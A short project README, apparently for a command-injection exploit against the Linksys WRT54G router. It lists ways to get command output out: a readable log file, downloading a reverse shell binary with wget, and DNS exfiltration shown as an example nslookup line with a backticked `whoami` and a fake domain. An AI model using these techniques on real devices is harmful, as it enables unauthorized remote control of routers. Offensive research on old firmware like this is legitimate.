# Exploiting Linksys WRT54G


### Leads for leaking command output
- [x] Look for file paths that are displayed within the web interface that command output can be written to.  
  Using `/tmp/ping.log` to view the output at `/Ping.asp`.
- [x] Use `wget` to download reverse shell binary to the router.
- [ ] Config the attacker as the DNS server and force the router to issue DNS requests with the command output.  
  Like ```nslookup `whoami`.fake.domain```


### TODOs
- Use argparse and make the exploit an executable.
- Start the reverse shell server within the exploit itself.


### Wonders & Thoughts
- If `ui_language` is stored in nvram (Non-Volatile Memory), how come it fixes itself upon reboot?


[Firmware Download Link](https://www.linksys.com/us/support-article?articleNum=148648)
